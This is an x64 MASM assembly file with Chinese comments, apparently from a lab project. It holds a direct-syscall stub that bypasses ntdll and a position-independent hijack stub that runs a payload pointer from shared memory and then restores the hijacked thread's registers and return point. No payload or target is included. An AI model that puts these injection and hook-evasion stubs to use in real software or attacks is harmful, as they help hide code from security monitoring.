; ============================================================================
; NtStub.asm  ——  x64 MASM 汇编桩
;
; 两个东西：
;   1) KsrNtStub      : 直连 syscall 的通用入口（第二层）
;   2) KsrHijackStub  : 调用链劫持的 stub（第三层）。它连同"现场区"会被整块
;                       拷贝到共享内存里执行，所以必须严格位置无关：
;                       - 只用 `lea r14, 块首` 取一次块基址（这条是 RIP 相对的，
;                         整块搬迁后位移不变）
;                       - 其余全部是 [r14 + 固定偏移]，不含任何绝对地址
;                       - 块内布局用 ORG 钉死偏移，C 侧有同样的常量可以核对
; ============================================================================

option casemap:none

PUBLIC KsrNtStub
PUBLIC KsrHijackStub
PUBLIC KsrHijackStubEnd
PUBLIC KsrHijackBodySlot
PUBLIC KsrHijackFxArea
PUBLIC KsrHijackCtx

; ---- 块内固定偏移（必须与 KsrLab.h 里的 KSR_STUB_OFF_* 一致）----
OFF_SLOT   EQU 100h                     ; 载荷函数指针
OFF_FX     EQU 110h                     ; FXSAVE 区（16 对齐，512 字节）
OFF_CTX    EQU 320h                     ; CONTEXT 副本（16 对齐，0x4D0 字节）
BLOCK_END  EQU 7F0h                     ; 块总长

; ---- CONTEXT 字段偏移（x64，与 winnt.h 一致，C 侧有编译期断言对拍）----
C_EFLAGS EQU 044h
C_RAX    EQU 078h
C_RCX    EQU 080h
C_RDX    EQU 088h
C_RBX    EQU 090h
C_RSP    EQU 098h
C_RBP    EQU 0A0h
C_RSI    EQU 0A8h
C_RDI    EQU 0B0h
C_R8     EQU 0B8h
C_R9     EQU 0C0h
C_R10    EQU 0C8h
C_R11    EQU 0D0h
C_R12    EQU 0D8h
C_R13    EQU 0E0h
C_R14    EQU 0E8h
C_R15    EQU 0F0h
C_RIP    EQU 0F8h

_TEXT SEGMENT

; ----------------------------------------------------------------------------
; uint64 KsrNtStub(uint32 Ssn, a1, a2, a3, a4, a5, a6)
;   C 调用约定进来：rcx=Ssn, rdx=a1, r8=a2, r9=a3,
;                  [rsp+28h]=a4, [rsp+30h]=a5, [rsp+38h]=a6
; 内核 syscall 约定要求：r10=a1, rdx=a2, r8=a3, r9=a4, 其余在栈上, eax=SSN
; ----------------------------------------------------------------------------
KsrNtStub PROC
    mov     r10, rdx                     ; a1 -> r10（syscall 前四项的第一项走 r10）
    mov     rdx, r8                      ; a2
    mov     r8,  r9                      ; a3
    mov     r9,  qword ptr [rsp+28h]     ; a4
    mov     rax, qword ptr [rsp+30h]     ; a5
    mov     qword ptr [rsp+28h], rax     ; a5 -> 第 5 个参数槽
    mov     rax, qword ptr [rsp+38h]     ; a6
    mov     qword ptr [rsp+30h], rax     ; a6 -> 第 6 个参数槽
    mov     eax, ecx                     ; SSN
    syscall                              ; 直接进内核，一次都没经过 ntdll
    ret
KsrNtStub ENDP

_TEXT ENDS

; ============================================================================
; 劫持 stub 单独放一个段，用 ORG 把块内偏移钉死，方便整块拷贝
; ============================================================================
_STUB SEGMENT ALIGN(16) 'CODE'

ORG 0
KsrHijackStub LABEL BYTE
    lea     r14, KsrHijackStub          ; 块基址（RIP 相对，搬迁后仍正确）
    fxsave  [r14+OFF_FX]                ; 512 字节：xmm0-15 + MXCSR

    and     rsp, -16                     ; 对齐，保证后面 call 的 ABI 正确
    sub     rsp, 20h                     ; 影子空间
    lea     rcx, [r14+OFF_CTX]           ; 载荷入参 = 上下文副本地址
    call    qword ptr [r14+OFF_SLOT]     ; 执行载荷

    ; ↑ 这里踩过一个真实的坑：基址绝不能放在 r11。
    ;   x64 调用约定里 rax/rcx/rdx/r8/r9/r10/r11 都是"易失"寄存器，被调用的
    ;   函数可以随便改写；r14 属于 callee-saved，函数返回时必须原样保留。
    ;   用 r11 当基址，call 返回后 r11 已是垃圾值，下一句 fxrstor 就会去写
    ;   一个非法地址 —— 事实上我们就是这样崩过一次（崩在 block+0x25）。

    fxrstor [r14+OFF_FX]                 ; 浮点/SIMD 现场原样还回去

    mov     eax, dword ptr [r14+OFF_CTX+C_EFLAGS]
    push    rax
    popfq                                ; CF/ZF/SF/OF/DF... 全部还原

    mov     rax, qword ptr [r14+OFF_CTX+C_RAX]
    mov     rcx, qword ptr [r14+OFF_CTX+C_RCX]
    mov     rdx, qword ptr [r14+OFF_CTX+C_RDX]
    mov     rbx, qword ptr [r14+OFF_CTX+C_RBX]
    mov     rbp, qword ptr [r14+OFF_CTX+C_RBP]
    mov     rsi, qword ptr [r14+OFF_CTX+C_RSI]
    mov     rdi, qword ptr [r14+OFF_CTX+C_RDI]
    mov     r8,  qword ptr [r14+OFF_CTX+C_R8]
    mov     r9,  qword ptr [r14+OFF_CTX+C_R9]
    mov     r10, qword ptr [r14+OFF_CTX+C_R10]
    mov     r12, qword ptr [r14+OFF_CTX+C_R12]
    mov     r13, qword ptr [r14+OFF_CTX+C_R13]
    mov     r15, qword ptr [r14+OFF_CTX+C_R15]

    mov     rsp, qword ptr [r14+OFF_CTX+C_RSP]    ; 栈指针精确还原
    push    qword ptr [r14+OFF_CTX+C_RIP]         ; 把原返回点压在原栈顶
    mov     r11, qword ptr [r14+OFF_CTX+C_R11]    ; 倒数第二个
    mov     r14, qword ptr [r14+OFF_CTX+C_R14]    ; 基址自己最后还原
    ret                                           ; -> 原 RIP，RSP 回到原值

ORG OFF_SLOT
KsrHijackBodySlot LABEL QWORD
    DQ 0

ORG OFF_FX
KsrHijackFxArea LABEL BYTE
    DB 512 DUP (0)

ORG OFF_CTX
KsrHijackCtx LABEL BYTE
    DB 4D0h DUP (0)

ORG BLOCK_END
KsrHijackStubEnd LABEL BYTE

_STUB ENDS

END
